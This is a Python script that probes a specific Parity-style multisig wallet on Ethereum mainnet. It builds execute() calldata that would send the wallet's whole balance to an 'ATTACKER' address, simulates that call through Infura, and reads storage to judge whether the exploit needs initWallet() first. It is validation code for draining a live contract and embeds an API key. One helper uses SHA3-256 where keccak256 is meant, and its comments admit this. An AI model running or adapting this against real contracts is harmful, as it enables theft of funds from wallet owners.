#!/usr/bin/env python3
"""
DEEP VALIDATION - Check if execute() works directly without initWallet
"""
import json
import subprocess

RPC = "https://mainnet.infura.io/v3/bfc7283659224dd6b5124ebbc2b14e2c"
ATTACKER = "0xDeaDbeefdEAdbeefdEadbEEFdeadbeEFdEaDbeeF"
WALLET = "0xbd6ed4969d9e52032ee3573e643f6a1bdc0a7e1e"

def rpc_call(method, params):
    payload = {"jsonrpc": "2.0", "method": method, "params": params, "id": 1}
    cmd = ["curl", "-s", "-X", "POST", "-H", "Content-Type: application/json",
           "-d", json.dumps(payload), RPC]
    result = subprocess.run(cmd, capture_output=True, text=True)
    try:
        return json.loads(result.stdout)
    except:
        return {"error": "parse_error", "raw": result.stdout}

def build_execute_calldata(to, value_wei):
    selector = "b61d27f6"
    to_padded = "000000000000000000000000" + to[2:].lower()
    value_hex = hex(value_wei)[2:].zfill(64)
    data_offset = "0000000000000000000000000000000000000000000000000000000000000060"
    data_len = "0000000000000000000000000000000000000000000000000000000000000000"
    return "0x" + selector + to_padded + value_hex + data_offset + data_len

print("DEEP VALIDATION: Can execute() be called directly?")
print("=" * 60)

# Get balance
bal = rpc_call("eth_getBalance", [WALLET, "latest"])
balance_wei = int(bal["result"], 16)
print(f"Wallet: {WALLET}")
print(f"Balance: {balance_wei / 1e18:.4f} ETH")

# Check m_numOwners
storage = rpc_call("eth_getStorageAt", [WALLET, "0x0", "latest"])
m_numOwners = int(storage["result"], 16)
print(f"m_numOwners: {m_numOwners}")

# Try execute directly via eth_call (not just estimateGas)
print("\n--- Testing execute() via eth_call ---")
execute_data = build_execute_calldata(ATTACKER, balance_wei)
tx = {
    "from": ATTACKER,
    "to": WALLET,
    "data": execute_data
}

result = rpc_call("eth_call", [tx, "latest"])
print(f"eth_call result: {result}")

# Check library's execute function logic
# Look at what onlyowner modifier does when m_numOwners=0
print("\n--- Checking owner validation logic ---")

# isOwner(address) - 0x2f54bf6e
is_owner_data = "0x2f54bf6e" + "000000000000000000000000" + ATTACKER[2:].lower()
is_owner_result = rpc_call("eth_call", [{"to": WALLET, "data": is_owner_data}, "latest"])
print(f"isOwner({ATTACKER[:10]}...): {is_owner_result}")

# Check m_ownerIndex[attacker] storage
# m_ownerIndex is at some slot, let's compute it
# In Parity wallet, owner indices are typically stored in a mapping

# Let's trace what happens in the onlyowner modifier
# The modifier checks: if (isOwner(msg.sender))
# isOwner checks: m_ownerIndex[_addr] > 0

# With m_numOwners = 0, what does m_ownerIndex contain?
# Let's check storage slot for ownerIndex mapping

# ownerIndex is typically at slot 2 or 3
# mapping(address => uint) m_ownerIndex
# slot = keccak256(address . slot_number)

import hashlib

def get_mapping_slot(key, slot_num):
    # keccak256(h(k) . h(p))
    key_padded = key[2:].lower().zfill(64)
    slot_padded = hex(slot_num)[2:].zfill(64)
    data = bytes.fromhex(key_padded + slot_padded)
    return "0x" + hashlib.sha3_256(data).hexdigest()  # Use keccak256

# Actually Python's hashlib doesn't have keccak256 directly
# Let's use a different approach - check raw storage slots

print("\n--- Raw storage analysis ---")
for slot in range(10):
    storage = rpc_call("eth_getStorageAt", [WALLET, hex(slot), "latest"])
    val = storage.get("result", "0x0")
    if val != "0x0000000000000000000000000000000000000000000000000000000000000000":
        print(f"Slot {slot}: {val}")

# The key insight: execute() gas estimate succeeding doesn't mean it would actually work
# eth_estimateGas can return a value even for reverting txs sometimes
# The real test is eth_call

print("\n--- Final determination ---")
if "result" in result and result["result"] != "0x":
    print("[!] execute() returned data - checking if it succeeded")
    print(f"    Return data: {result['result']}")
elif "error" in result:
    error = result["error"]
    if isinstance(error, dict):
        msg = error.get("message", str(error))
    else:
        msg = str(error)
    print(f"[✓] execute() reverts as expected: {msg}")
    print("    Exploit requires initWallet() first")
else:
    print(f"[?] Unexpected result: {result}")

